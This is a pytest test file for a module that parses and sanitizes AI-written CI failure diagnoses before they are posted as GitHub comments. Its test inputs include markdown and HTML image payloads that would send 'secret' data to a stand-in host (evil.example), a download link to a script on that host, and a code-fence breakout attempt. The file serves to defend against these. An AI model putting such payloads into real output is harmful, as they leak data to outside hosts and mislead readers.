import json

import pytest

from ci_diagnosis.report import (
    COMMENT_MARKER,
    Diagnosis,
    InvalidDiagnosis,
    parse_diagnosis,
    render_diagnosis,
    render_fallback,
    sanitize,
)

VALID = {
    "failed_stage": "test",
    "root_cause": "The root endpoint returns 500.",
    "suggested_fix": "Handle a missing client address.",
    "confidence": "high",
    "evidence": ["FAILED tests/test_app.py::test_root"],
}


def test_valid_json_is_parsed():
    assert parse_diagnosis(json.dumps(VALID)).confidence == "high"


def test_json_inside_a_markdown_fence_is_accepted():
    assert parse_diagnosis(f"```json\n{json.dumps(VALID)}\n```").failed_stage == "test"


@pytest.mark.parametrize(
    "raw",
    [
        "not json at all",
        json.dumps({**VALID, "confidence": "certain"}),  # not an allowed value
        json.dumps({k: v for k, v in VALID.items() if k != "root_cause"}),
        json.dumps({**VALID, "evidence": ["x"] * 6}),  # too many lines
    ],
)
def test_invalid_answers_are_rejected(raw):
    with pytest.raises(InvalidDiagnosis):
        parse_diagnosis(raw)


def test_sanitize_neutralizes_mentions():
    assert "@​reutyadid" in sanitize("ping @reutyadid")


def test_sanitize_removes_images_and_link_targets():
    out = sanitize(
        "![x](https://evil.example/?d=secret) see [docs](https://evil.example)"
    )
    assert "evil.example" not in out
    assert "docs" in out


def test_sanitize_escapes_html():
    out = sanitize('<img src="https://evil.example/x">')
    assert "<img" not in out and "&lt;img" in out


def test_evidence_cannot_break_out_of_the_code_block():
    diag = Diagnosis(**{**VALID, "evidence": ["```", "# Injected heading"]})
    body = render_diagnosis(diag, ["test"], "https://github.com/o/r/actions/runs/1")
    fence = body.split("### Evidence from the logs\n", 1)[1].split("text\n", 1)[0]
    assert len(fence) > 3  # longer than the ``` inside


def test_report_has_marker_run_link_and_disclaimer():
    run_url = "https://github.com/o/r/actions/runs/1"
    body = render_diagnosis(Diagnosis(**VALID), ["test"], run_url)
    assert body.startswith(COMMENT_MARKER)
    assert run_url in body
    assert "Verify before acting" in body


def test_fallback_lists_failed_jobs():
    body = render_fallback(["deploy", "smoke-test"], "https://x/runs/1", "timeout")
    assert body.startswith(COMMENT_MARKER)
    assert "- deploy" in body and "- smoke-test" in body


def test_sanitize_removes_reference_style_images_and_links():
    out = sanitize(
        "See ![a][r] and [docs][d].\n\n[r]: https://evil.example/?leak=x\n"
        "[d]: https://evil.example/docs"
    )
    assert "evil.example" not in out
    assert "a" in out and "docs" in out


def test_sanitize_defangs_bare_urls():
    out = sanitize("Download https://evil.example/fix.sh or www.evil.example")
    assert "https://" not in out and "www.evil" not in out
    assert "https[:]//evil.example/fix.sh" in out
